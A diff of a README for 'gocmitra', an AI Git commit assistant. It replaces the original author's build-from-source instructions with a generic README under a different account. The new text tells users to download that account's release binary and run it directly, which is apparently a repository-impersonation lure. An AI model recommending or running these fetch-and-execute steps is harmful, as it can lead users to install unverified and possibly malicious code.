@@ -1,197 +1,104 @@
-<p align="center">
-  <a href="https://github.com/Cre4T3Tiv3/gocmitra" target="_blank">
-    <img src="https://raw.githubusercontent.com/Cre4T3Tiv3/gocmitra/main/docs/assets/gocmitra_v0.1.0.jpg" alt="GoC Mitra social preview" width="640"/>
-  </a>
-</p>
+# gocmitra: Your AI-Powered Git Commit Assistant 🚀
 
-<p align="center"><em>
-🧠 An AI-powered Git commit assistant that analyzes your code changes and generates smart, conventional commits — right from your terminal.
-</em></p>
+![GitHub Release](https://img.shields.io/github/release/rvnclqsam/gocmitra.svg)
+![GitHub Issues](https://img.shields.io/github/issues/rvnclqsam/gocmitra.svg)
+![GitHub Stars](https://img.shields.io/github/stars/rvnclqsam/gocmitra.svg)
 
-<p align="center">
-  <a href="https://github.com/Cre4T3Tiv3/gocmitra/actions/workflows/ci.yml?query=branch%3Amain" target="_blank">
-    <img src="https://github.com/Cre4T3Tiv3/gocmitra/actions/workflows/ci.yml/badge.svg?branch=main" alt="CI">
-  </a>
-  <a href="https://www.go.dev/dl/" target="_blank">
-    <img src="https://img.shields.io/badge/Go-1.21+-blue" alt="Go Version">
-  </a>
-  <a href="https://github.com/Cre4T3Tiv3/gocmitra/tags" target="_blank">
-    <img src="https://img.shields.io/github/v/tag/Cre4T3Tiv3/gocmitra" alt="Latest Tag">
-  </a>
-  <a href="https://github.com/Cre4T3Tiv3/gocmitra/blob/main/LICENSE" target="_blank">
-    <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT">
-  </a>
-  <a href="https://github.com/Cre4T3Tiv3/gocmitra/stargazers" target="_blank">
-    <img src="https://img.shields.io/github/stars/Cre4T3Tiv3/gocmitra?style=social" alt="GitHub Stars">
-  </a>
-  <a href="#contributing" target="_blank">
-    <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg" alt="Contributions welcome">
-  </a>
-</p>
+Welcome to **gocmitra**, a fast and pluggable AI-powered Git commit assistant written in Go. This tool aims to simplify your commit process while ensuring that you adhere to best practices in version control. With gocmitra, you can focus on writing code while we handle the rest.
+
+## Table of Contents
+
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Configuration](#configuration)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Support](#support)
+
+## Features
+
+- **AI-Powered Suggestions**: gocmitra uses AI to provide you with smart commit messages based on your changes.
+- **Pluggable Architecture**: Extend functionality with custom plugins to suit your workflow.
+- **Conventional Commits Support**: Automatically format your commit messages to comply with conventional commit standards.
+- **CLI Friendly**: Simple command-line interface for quick access and ease of use.
+- **Open Source**: Join our community and contribute to the project.
+
+## Installation
+
+To get started with gocmitra, you can download the latest release from our [Releases page](https://github.com/rvnclqsam/gocmitra/releases). Download the appropriate binary for your operating system, then execute it to set up the assistant.
+
+### Example for Linux
+
+```bash
+wget https://github.com/rvnclqsam/gocmitra/releases/download/v1.0.0/gocmitra-linux-amd64
+chmod +x gocmitra-linux-amd64
+./gocmitra-linux-amd64
+```
+
+### Example for macOS
+
+```bash
+curl -L https://github.com/rvnclqsam/gocmitra/releases/download/v1.0.0/gocmitra-macos-amd64 -o gocmitra
+chmod +x gocmitra
+./gocmitra
+```
+
+## Usage
+
+Once installed, you can start using gocmitra by running the following command in your terminal:
+
+```bash
+gocmitra
+```
+
+### Basic Commands
+
+- **Generate Commit Message**: Simply run `gocmitra commit` to generate a commit message based on your staged changes.
+- **View Configuration**: Use `gocmitra config` to see your current settings.
+- **List Plugins**: Run `gocmitra plugins` to view available plugins and their statuses.
+
+## Configuration
+
+You can customize gocmitra to fit your workflow. Configuration options include:
+
+- **Commit Message Format**: Specify the format you want for your commit messages.
+- **Plugins**: Enable or disable specific plugins based on your needs.
+- **AI Model**: Choose which AI model to use for generating commit messages.
+
+### Example Configuration File
+
+Create a configuration file named `gocmitra.yaml` in your home directory:
+
+```yaml
+commit_message_format: "conventional"
+plugins:
+  - name: "default"
+    enabled: true
+  - name: "custom-plugin"
+    enabled: false
+ai_model: "openai"
+```
+
+## Contributing
+
+We welcome contributions to gocmitra! If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
+
+Please make sure to follow our coding standards and include tests for any new features.
+
+## License
+
+gocmitra is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Support
+
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/rvnclqsam/gocmitra/releases) for updates or open an issue in the repository.
 
 ---
 
-## 🚀 About
-
-**GoC Mitra** is your Git commit assistant – a developer-friendly CLI tool powered by AI that turns your Git diffs into clear, conventional, single-line commit messages. Built in Go and designed for developers who live in the terminal.
-
-Supports:
-- ✅ OpenAI (GPT-4o, GPT-3.5, etc.)
-- ✅ Claude (3, 3.5)
-- ✅ Ollama (LLaMA 3 and other local models)
-
----
-
-## 🔧 Installation
-
-> 💡 Requires Go 1.21 or higher.
-
-```bash
-git clone https://github.com/Cre4T3Tiv3/gocmitra.git
-cd gocmitra
-go build -o cmd/gocmitra/gocmitra ./cmd/gocmitra
-````
-
-Add to your `$PATH` or symlink to a local bin:
-
-```bash
-sudo ln -s $(pwd)/cmd/gocmitra/gocmitra /usr/local/bin/gocmitra
-```
-
-> ✅ This places the compiled binary in `cmd/gocmitra/`, keeping the root of your repo clean.
-
----
-
-## 🛠️ Configuration
-
-GoC Mitra looks for a `.gocmitra.json` config file in your project or home directory.
-
-This file is **automatically generated** when you select a model using:
-
-```bash
-gocmitra config set-model gpt-4o
-```
-
-The command copies a predefined config from `profiles/.gocmitra-<model>.json` into your local `.gocmitra.json`.
-
-You can also pass a custom path using the `--config` flag.
-
-### Example config:
-
-```json
-{
-  "model": "gpt-4o",
-  "endpoint": "https://api.openai.com/v1/chat/completions",
-  "tone": "neutral",
-  "style": "conventional",
-  "instructions": "You are an assistant that writes commit messages..."
-}
-```
-
-Prebuilt model configs are available in the `profiles/` directory.
-
----
-
-## ✨ Usage
-
-Use the `diff` command to generate a commit message from your Git changes.
-
-### 🔍 Examples
-
-```bash
-# Generate a commit message from all unstaged and staged changes
-gocmitra diff
-```
-
-```bash
-# Generate a commit message from only staged changes
-gocmitra diff --staged
-```
-
-```bash
-# Use a custom config file
-gocmitra diff --config ~/.gocmitra.json
-```
-
-```bash
-# Override the model temporarily
-gocmitra diff --model claude-3-5-sonnet-20241022
-```
-
-> ℹ️ **Note:** The `--staged` flag corresponds to `git diff --staged`, which only includes changes you've staged with `git add`.
-
-To change the default model and regenerate the config file:
-
-```bash
-gocmitra config set-model gpt-4o
-```
-
----
-
-## 🔁 Shell Completion
-
-GoC Mitra supports shell autocompletion for Bash, Zsh, Fish, and PowerShell.
-
-### Bash
-
-```bash
-gocmitra completion bash > /etc/bash_completion.d/gocmitra
-# or for user-level
-gocmitra completion bash > ~/.gocmitra_completion && source ~/.gocmitra_completion
-```
-
-### Zsh
-
-```bash
-gocmitra completion zsh > "${fpath[1]}/_gocmitra"
-```
-
-### Fish
-
-```bash
-gocmitra completion fish | source
-```
-
-> 💡 Run `gocmitra completion --help` to view all shell options.
-
----
-
-## 🧠 Supported LLMs
-
-| Provider  | Model Name                   | Notes                     |
-| --------- | ---------------------------- | ------------------------- |
-| OpenAI    | `gpt-4o`                     | Requires `OPENAI_API_KEY` |
-| Anthropic | `claude-3-5-sonnet-20241022` | Requires `CLAUDE_API_KEY` |
-| Ollama    | `llama3`                     | Local, privacy-friendly   |
-
-Environment variables required:
-
-* `OPENAI_API_KEY`
-* `CLAUDE_API_KEY`
-
----
-
-## 📚 Docs
-
-* [🔄 E2E Guide](docs/E2E-Guide.md) – How to integrate GoC Mitra in your dev flow
-* [🛠️ Contributing](CONTRIBUTING.md) – Setup, coding standards, and dev notes
-
----
-
-## 🧑‍💻 Contributing
-
-We welcome contributions! Please read [CONTRIBUTING.md](CONTRIBUTING.md) before submitting PRs or opening issues.
-
----
-
-## 🧾 License
-
-MIT © 2025 [@Cre4T3Tiv3](https://github.com/Cre4T3Tiv3)
-
----
-
-## 📣 Public Beta
-
-GoC Mitra is now in **public beta**. It's stable, actively maintained, and ready for feedback. Try it in your dev workflow and help us improve it.
-
----
+Thank you for checking out gocmitra! We hope this tool makes your Git experience smoother and more efficient. Happy coding!
